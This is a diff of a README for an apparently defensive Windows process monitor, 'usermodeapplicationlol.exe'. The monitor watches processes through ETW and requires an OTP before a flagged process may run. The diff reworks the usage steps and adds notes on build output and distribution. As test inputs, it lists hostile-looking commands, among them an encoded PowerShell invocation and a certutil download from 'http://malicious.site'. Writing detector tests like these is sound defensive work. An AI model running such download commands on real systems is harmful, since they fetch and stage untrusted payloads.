@@ -65,25 +65,57 @@ flowchart TD
 
 ---
 
-## Usage
+## How to Use
 
-### 1. Start the Monitor
-Run as Administrator:
-```sh
-usermodeapplicationlol.exe
+1. **Open a Command Prompt as Administrator.**
+   - This is required for ETW monitoring and process control.
+
+2. **Navigate to the directory containing `usermodeapplicationlol.exe`.**
+   ```sh
+   cd "D:/window driver projects/usermodeapplicationlol"
+   ```
+
+3. **Start the Monitor.**
+   ```sh
+   usermodeapplicationlol.exe
+   ```
+   - You should see output indicating the ETW monitor has started.
+
+4. **Generate Test Events.**
+   - In another terminal, run commands such as:
+     - `cmd.exe /c whoami`
+     - `powershell.exe -encodedcommand SQBtAG...`
+     - `certutil.exe -urlcache -split -f http://malicious.site file.exe`
+     - `notepad.exe` (should not be flagged)
+
+5. **Respond to OTP Prompts.**
+   - If a process is flagged as suspicious/malicious, you will see a GUI OTP prompt.
+   - Enter the correct OTP (from your configured list) to allow the process, or fail to block it.
+   - For admin override, you will be prompted for two distinct OTPs.
+
+6. **Review Logs.**
+   - Check `log_all.txt`, `log_otp_correct_malicious.txt`, and `log_otp_incorrect.txt` for details on detections and actions.
+
+---
+
+## Compiled Executable (x64/Release/usermodeapplicationlol.exe)
+
+After building your project in Visual Studio (Release mode), the main executable will be located at:
+
+```
+x64/Release/usermodeapplicationlol.exe
 ```
 
-### 2. Generate Test Events
-Open another terminal and run commands such as:
-- `cmd.exe /c whoami`
-- `powershell.exe -encodedcommand SQBtAG...`
-- `certutil.exe -urlcache -split -f http://malicious.site file.exe`
-- `notepad.exe` (should not be flagged)
+- This is the optimized, production-ready version of your monitoring application.
+- **Run this file as Administrator** to start the process monitoring system.
+- If you use OTP verification, ensure `otpverify.exe` is also present in the same directory or in your system PATH.
 
-### 3. Observe
-- Suspicious/malicious processes are suspended and prompt for OTP.
-- Admin override requires two distinct OTPs.
-- All actions are logged in `log_all.txt`, `log_otp_correct_malicious.txt`, and `log_otp_incorrect.txt`.
+### Best Practices for GitHub and Distribution
+- **Do NOT commit this file or any other build artifacts to your GitHub repository.**
+  - Executables and build outputs should be excluded using your `.gitignore` file.
+  - Only source code, scripts, and documentation should be tracked in git.
+- **Distribute binaries separately** (e.g., via a GitHub release, zip file, or installer) if you want to share the executable.
+- Always build from source for each environment when possible.
 
 ---
 
